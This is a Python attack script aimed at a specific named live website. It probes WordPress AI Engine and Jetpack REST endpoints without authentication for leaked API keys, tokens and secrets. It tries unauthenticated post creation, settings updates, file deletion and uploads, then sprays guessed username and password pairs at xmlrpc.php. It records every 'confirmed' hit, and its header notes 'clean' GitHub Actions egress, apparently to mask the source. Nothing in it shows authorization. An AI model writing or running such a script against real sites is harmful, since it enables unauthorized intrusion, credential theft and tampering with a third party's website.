#!/usr/bin/env python3
"""AI Engine 2.0.9 + Jetpack Critical unauth probe (clean GHA egress)."""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

results = {"ts": time.time(), "confirmed": [], "leads": [], "tests": []}


def http(method, url, data=None, headers=None, timeout=35):
    h = {"User-Agent": "Mozilla/5.0 lurksek-mwai", "Accept": "application/json"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read()
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body
    except Exception as e:
        return 0, time.time() - t0, str(e).encode()


def note(entry):
    results["tests"].append(entry)
    print(
        f"{entry.get('method','?'):4s} {entry.get('path','?'):55s} "
        f"{entry.get('code')} {(entry.get('body') or '')[:120]!r}",
        flush=True,
    )


def interesting(body: str) -> bool:
    b = body.lower()
    keys = [
        "api_key",
        "apikey",
        "openai",
        "sk-",
        "secret",
        "bearer",
        "password",
        "token",
        "aws_",
        "pinecone",
        "anthropic",
        "claude",
        "gpt-4",
        "model",
        "success",
        "file_id",
        "url",
        "upload",
    ]
    return any(k in b for k in keys)


def main():
    # --- AI Engine Critical candidates ---
    gets = [
        "/wp-json/mwai/v1/settings/list",
        "/wp-json/mwai/v1/settings/chatbots",
        "/wp-json/mwai/v1/settings/themes",
        "/wp-json/mwai/v1/helpers/count_posts",
        "/wp-json/mwai/v1/helpers/post_types",
        "/wp-json/mwai/v1/helpers/post_content",
        "/wp-json/mwai/v1/openai/files/list",
        "/wp-json/mwai/v1/openai/finetunes/list",
        "/wp-json/mwai/v1/openai/incidents",
        "/wp-json/mwai/v1/system/templates",
        "/wp-json/jetpack/v4/connection",
        "/wp-json/jetpack/v4/connection/data",
        "/wp-json/jetpack/v4/connection/plugins",
        "/wp-json/jetpack/v4/connection/authorize_url",
    ]

    for path in gets:
        code, t, body = http("GET", TARGET + path, timeout=30)
        text = body[:800].decode("utf-8", "replace")
        entry = {"method": "GET", "path": path, "code": code, "time": round(t, 3), "body": text}
        note(entry)
        if code == 200:
            results["leads"].append(entry)
            # Critical: settings leak with API keys
            if "settings" in path and any(
                k in text.lower() for k in ["api_key", "apikey", "sk-", "secret", "openai", "token"]
            ):
                results["confirmed"].append(
                    {"type": "mwai_settings_unauth_secret_leak", "path": path, "body": text[:1500]}
                )
                print("CRITICAL_SETTINGS_LEAK", flush=True)
            if "openai/files" in path and code == 200 and "rest_forbidden" not in text.lower():
                results["confirmed"].append(
                    {"type": "mwai_openai_files_unauth", "path": path, "body": text[:1500]}
                )
                print("CRITICAL_OPENAI_FILES", flush=True)
            if "jetpack" in path and any(k in text.lower() for k in ["blog_id", "master_user", "access_token"]):
                results["confirmed"].append(
                    {"type": "jetpack_connection_leak", "path": path, "body": text[:1500]}
                )
                print("CRITICAL_JETPACK", flush=True)

    # POST probes (auth gate differentials)
    posts = [
        (
            "/wp-json/mwai/v1/settings/list",
            b"{}",
            {"Content-Type": "application/json"},
        ),  # sometimes POST variant
        (
            "/wp-json/mwai/v1/ai/completions",
            json.dumps({"message": "ping", "botId": "default"}).encode(),
            {"Content-Type": "application/json"},
        ),
        (
            "/wp-json/mwai-ui/v1/chats/submit",
            json.dumps({"message": "ping", "botId": "default", "chatId": "crit"}).encode(),
            {"Content-Type": "application/json"},
        ),
        (
            "/wp-json/mwai/v1/helpers/create_post",
            json.dumps({"title": "crit-probe", "content": "x"}).encode(),
            {"Content-Type": "application/json"},
        ),
        (
            "/wp-json/mwai/v1/openai/files/list",
            b"{}",
            {"Content-Type": "application/json"},
        ),
        (
            "/wp-json/mwai/v1/system/logs/list",
            b"{}",
            {"Content-Type": "application/json"},
        ),
        (
            "/wp-json/mwai-ui/v1/files/delete",
            json.dumps({"fileId": "1", "chatId": "x"}).encode(),
            {"Content-Type": "application/json"},
        ),
        (
            "/wp-json/mwai/v1/settings/update",
            json.dumps({"ai_models": []}).encode(),
            {"Content-Type": "application/json"},
        ),
    ]

    for path, data, headers in posts:
        code, t, body = http("POST", TARGET + path, data=data, headers=headers, timeout=35)
        text = body[:800].decode("utf-8", "replace")
        entry = {"method": "POST", "path": path, "code": code, "time": round(t, 3), "body": text}
        note(entry)
        if code == 200 and "rest_forbidden" not in text.lower() and "unauthorized" not in text.lower():
            results["leads"].append(entry)
            if interesting(text) or "create_post" in path or "settings/update" in path:
                results["confirmed"].append(
                    {
                        "type": "mwai_unauth_write_or_ai",
                        "path": path,
                        "body": text[:1500],
                    }
                )
                print("CRITICAL_MWAI_UNAUTH", path, flush=True)

    # Multipart file upload (mwai-ui)
    boundary = "----LurksekMWAI"
    parts = [
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"probe.txt\"\r\n"
        f"Content-Type: text/plain\r\n\r\nprobe\r\n--{boundary}--\r\n"
    ]
    data = "".join(parts).encode()
    for path in ["/wp-json/mwai-ui/v1/files/upload", "/wp-json/mwai/v1/openai/files/upload"]:
        code, t, body = http(
            "POST",
            TARGET + path,
            data=data,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            timeout=40,
        )
        text = body[:500].decode("utf-8", "replace")
        entry = {"method": "POST", "path": path, "code": code, "time": round(t, 3), "body": text}
        note(entry)
        if code == 200 and "rest_forbidden" not in text.lower() and "unauthorized" not in text.lower():
            results["confirmed"].append({"type": "mwai_unauth_upload", "path": path, "body": text[:1000]})
            print("CRITICAL_UNAUTH_UPLOAD", path, flush=True)

    # xmlrpc tiny spray (parallel would be better but keep small to avoid WAF)
    print("=== XMLRPC ===", flush=True)
    pairs = [
        ("Kznbk90iub0e", "Kznbk90iub0e"),
        ("Kznbk90iub0e", "kznvip"),
        ("admin", "admin"),
        ("kznemvifiv", "kznemvifiv"),
        ("kznvip", "kznvip123"),
    ]
    for u, p in pairs:
        xml = (
            '<?xml version="1.0"?>'
            "<methodCall><methodName>wp.getUsersBlogs</methodName>"
            f"<params><param><value><string>{u}</string></value></param>"
            f"<param><value><string>{p}</string></value></param></params></methodCall>"
        )
        code, t, body = http(
            "POST",
            TARGET + "/xmlrpc.php",
            data=xml.encode(),
            headers={"Content-Type": "text/xml"},
            timeout=20,
        )
        text = body[:300].decode("utf-8", "replace")
        hit = ("isAdmin" in text or "blogid" in text.lower()) and "fault" not in text.lower()
        note({"method": "POST", "path": f"xmlrpc:{u}", "code": code, "body": text, "hit": hit})
        if hit:
            results["confirmed"].append({"type": "xmlrpc_weak_creds", "user": u, "pass": p, "body": text})
            print("CRITICAL_XMLRPC", u, flush=True)

    results["confirmed_count"] = len(results["confirmed"])
    results["leads_count"] = len(results["leads"])
    for p in (OUT / "mwai_critical.json", Path("out/mwai_critical.json")):
        p.write_text(json.dumps(results, indent=2))
    print(
        "DONE confirmed=",
        results["confirmed_count"],
        "leads=",
        results["leads_count"],
        flush=True,
    )


if __name__ == "__main__":
    main()
